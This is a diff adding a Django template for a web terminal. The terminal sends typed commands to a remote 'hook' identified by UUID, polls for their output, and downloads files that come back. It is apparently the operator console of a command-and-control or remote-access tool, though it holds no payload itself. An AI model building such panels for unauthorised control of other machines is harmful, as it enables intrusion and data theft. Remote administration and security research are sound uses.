@@ -1,0 +1,118 @@
+{% extends 'main/main.html' %} {% load static %} {% block content %}
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+
+<script>
+    function getCookie(name) {
+      let cookieValue = null;
+      if (document.cookie && document.cookie !== '') {
+          const cookies = document.cookie.split(';');
+          for (let i = 0; i < cookies.length; i++) {
+              const cookie = cookies[i].trim();
+              if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                  cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                  break;
+              }
+          }
+      }
+      return cookieValue;
+    }
+
+    function downloadFile(url, filename) {
+        fetch(url)
+          .then(response => response.blob())
+          .then(blob => {
+            const blobURL = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = blobURL;
+            link.download = filename;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+          })
+          .catch(error => {
+            console.log('Error:', error);
+          });
+      }
+  </script>
+  <style>
+    html, body {
+        height: 100%;
+        margin: 0;
+        color: #00ff00;
+        font-family: 'Courier New', monospace;
+    }
+</style>
+<div class="background-3"></div>
+<textarea readonly id="command-output"></textarea>
+<input type="text" id="command-input" placeholder="Enter command">
+<input type="hidden" id="hook-uuid" value="{{ hook.uuid }}">
+
+<script>
+    var commandHistory = [];
+  
+    $('#command-input').on('keypress', function(event) {
+        if (event.which === 13) {  
+            event.preventDefault();
+            runCommand();
+        }
+    });
+  
+    function runCommand() {
+        const command = $('#command-input').val();
+        const hook_uuid = $('#hook-uuid').val();
+        $.ajax({
+            url: '/command/create/',
+            type: 'POST',
+            data: {command: command, uuid: hook_uuid},
+            headers: {"X-CSRFToken": getCookie('csrftoken')},
+            success: function(data) {
+                $('#command-input').val('');  
+                
+                const cmd = {command: command, processed: false, 'id': data.id, 'response': '', 'printed': false};
+                commandHistory.push(cmd);
+                
+                $('#command-output').val($('#command-output').val() + '\n> ' + cmd.command);
+                $('#command-output').scrollTop($('#command-output')[0].scrollHeight);
+                const interval = setInterval(function () {
+                    $.get('/command/' + data.id + '/', function(response) {
+                        if (response.processed) {
+                            clearInterval(interval);
+                        }
+                        const c = commandHistory.find(i => i.id == data.id);
+                        if (c) {
+                            c.processed = true;
+                            if (response.file) {
+                                console.log("file")
+                                const fileURL = response.file;
+                                const fileName = response.file.split('/').pop();
+                                downloadFile(fileURL, fileName);
+                                c.response = 'File Downloaded';
+                            } else {
+                                console.log("response")
+                                c.response = response.response;
+                            }
+                            updateCommandHistory();
+                        }
+                    })
+                }, 2000)
+            }
+        });
+    }
+  
+    function updateCommandHistory() {
+        commandHistory.forEach(command => {
+            if (command.processed && !command.printed) {
+                $('#command-output').val($('#command-output').val() + '\n' + command.response + '\n');
+                command.printed = true;  
+            }
+        });
+  
+        $('#command-output').scrollTop($('#command-output')[0].scrollHeight);
+    }
+  </script>
+  
+  
+  
+  
+{% endblock %}
